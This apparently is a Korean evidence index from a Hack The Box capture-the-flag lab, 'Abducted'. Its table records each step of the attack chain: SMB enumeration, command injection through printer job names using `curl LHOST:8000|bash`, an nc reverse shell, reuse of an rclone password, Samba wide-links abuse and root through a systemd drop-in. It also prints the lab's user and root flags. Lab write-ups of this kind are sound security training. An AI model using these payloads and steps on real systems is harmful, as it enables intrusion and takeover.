# 증적 인덱스 — HTB Abducted (10.129.244.177)

| ID | 시각(KST) | 단계 | 명령/요청 | 파일 경로 | 핵심 확인 내용 | 민감도 | 상태 | 카테고리 |
|---|---|---|---|---|---|---|---|---|
| E01 | 2026-09-07 10:17 | 정보수집 | `nmap -p- --min-rate 3000 -T4` | scans/E01_nmap_full_tcp.txt | TCP 22/139/445만 오픈 | 낮음 | 확인됨 | endpoint, host-ip |
| E02 | 2026-09-07 10:17 | 정보수집 | `nmap -p22,139,445 -sC -sV` | scans/E02_nmap_service_scripts.txt | OpenSSH 9.6p1 Ubuntu, Samba smbd 4, 시계 스큐 -23h56m | 낮음 | 확인됨 | endpoint |
| E03 | 2026-09-07 10:18 | 정보수집 | `smbclient -N -L //TARGET/` | scans/E03_smbclient_list.txt | 공유 목록: HP-Reception(Printer), projects, transfer, IPC$ | 낮음 | 확인됨 | endpoint |
| E04 | 2026-09-07 10:19 | 정보수집 | `smbclient -N //TARGET/transfer` | scans/E04_smb_transfer_ls.txt | 익명 tree connect 거부(ACCESS_DENIED) | 낮음 | 확인됨 | endpoint |
| E05 | 2026-09-07 10:19 | 정보수집 | `smbclient -N //TARGET/projects` | scans/E05_smb_projects_ls.txt | 익명 tree connect 거부(ACCESS_DENIED) | 낮음 | 확인됨 | endpoint |
| E06 | 2026-09-07 10:20 | 정보수집 | `rpcclient -U '' -N -c 'enumdomusers'` | scans/E06_rpcclient_enumdomusers.txt | null 세션으로 도메인 사용자 `scott` 1명 확인 | 중간 | 확인됨 | credential, host-ip |
| E07 | 2026-09-07 10:20 | 정보수집 | `rpcclient -c 'queryuser 0x3e8'` | scans/E07_rpcclient_queryuser_scott.txt | scott Full Name=Scott Mercer, 힌트성 필드 없음 | 낮음 | 확인됨 | credential |
| E08 | 2026-09-07 10:21 | 정보수집 | `smbmap -u '' -p ''` | scans/E08_smbmap_anon.txt | 모든 디스크 공유 NO ACCESS(익명) | 낮음 | 확인됨 | endpoint |
| E09 | 2026-09-07 10:21 | 정보수집 | `nmap --script smb-enum-shares,smb-enum-users,...` | scans/E09_nmap_smb_scripts.txt | SMB2/3 다이얼렉트만 지원(SMB1 없음), 추가 취약 스크립트 특이사항 없음 | 낮음 | 확인됨 | endpoint |
| E10 | 2026-09-07 10:39 | 초기접근 | `cat /etc/samba/smb.conf; cat /etc/samba/shares.conf; cat /usr/local/bin/printaudit` (nobody 리버스쉘) | http/E10_smb_conf_and_shares.txt (정리본, 원본은 logs/E13) | `print command = /usr/local/bin/printaudit %J %s`, printaudit이 `%1`(=%J)을 이스케이프 없이 쉘에 전달 | 중간 | 확인됨 | vuln, file-path |
| E11 | 2026-09-07 10:39 | 초기접근 후 정찰 | `id;whoami;hostname; cat /etc/passwd; cat /etc/group; ls /srv,/home; find / -iname *rclone*` (nobody) | http/E11_nobody_recon.txt (정리본, 원본은 logs/E13) | uid=65534(nobody) 코드실행 확인, scott/marcus 시스템 계정 확인, `/opt/offsite-backup/rclone.conf` 발견 | 중간 | 확인됨 | process, host-ip, file-path |
| E12 | 2026-09-07 10:38–16:51 | 초기접근 취약점 검증 | HP-Reception 인쇄 잡 이름에 `` `curl LHOST:8000\|bash` ``, `$(curl LHOST:8000\|bash)` 등 삽입 후 제출 (scripts/E10~E16) | http/E12_http_callback_log.txt | 대상 IP(10.129.244.177)에서 공격자 HTTP 리스너로 아웃바운드 콜백 다수 수신 — 커맨드 인젝션 실증 | 중간 | 확인됨 | vuln, endpoint |
| E13 | 2026-09-07 16:55 | 초기접근~자격증명 | 리버스쉘 원본 세션 로그 (FIFO 기반 nc 4446) | logs/E13_reverse_shell_session_raw.log | smb.conf/shares.conf/printaudit/passwd/group/rclone.conf 원문, `rclone reveal` 실행 결과 전부 포함 | 높음(비밀번호 포함) | 확인됨 | credential, vuln, file-path |
| E14 | 2026-09-07 17:00 | 사용자 권한 획득 | `ssh scott@TARGET 'id;whoami;hostname'`, `cat user.txt` | loot/E14_scott_ssh_and_user_flag.txt | scott SSH 로그인 성공(uid=1000), user flag `340f70330e7e5bcdcda38b7556e664b6` 확인 | 높음(flag) | 확인됨 | credential |
| E15 | 2026-09-07 17:01 | 횡적 이동 | 심링크 생성(`homelink`, `sshlink`) + smbclient(scott 인증)로 `.ssh` 생성/`authorized_keys` 업로드, `ssh marcus@TARGET` | http/E15_wide_links_privesc_to_marcus.txt | wide-links + force user 악용으로 marcus SSH 획득(uid=1001, groups=marcus,operators) | 높음 | 확인됨 | vuln, credential |
| E16 | 2026-09-07 17:05 | 권한 상승 | `/etc/systemd/system/smbd.service.d/zz-priv.conf` 배치 후 `systemctl daemon-reload && systemctl restart smbd` (marcus) | loot/E16_root_via_smbd_dropin.txt | operators 그룹의 smbd.service.d 그룹쓰기 권한 악용, ExecStartPre가 root로 실행되어 root flag `1454289f6f541d9889946fce9320f0ee` 확보 | 높음(flag) | 확인됨 | vuln, credential, process |
| E17 | 2026-09-07 17:05 | 취약점 원인 요약 | — | loot/E17_credentials_summary.txt | rclone 난독화 비밀번호 → scott 재사용 확인 요약(정리본) | 높음 | 확인됨 | credential |

참고: 스크립트 원본은 `scripts/E10_*.sh~E17_*.conf` 참고 (증적 ID와 스크립트 파일명의 E-번호는 생성 시점 혼선으로 1:1 대응하지 않음 — 자료 간 불일치 각주 참고).

> [!warning] 자료 간 불일치
> `scripts/` 폴더의 파일명(E10_print_injection_test.sh ~ E17_priv_dropin.conf)은 작업 중 실시간으로 순차 부여한 이름이며, 위 표의 증적 ID(E10~E17)는 evidence-index 관례에 따라 별도로 재부여했다. 두 번호 체계는 우연히 겹치는 구간이 있으나 서로 다른 시퀀스이므로 파일명만으로 증적 ID를 추정하지 말 것.
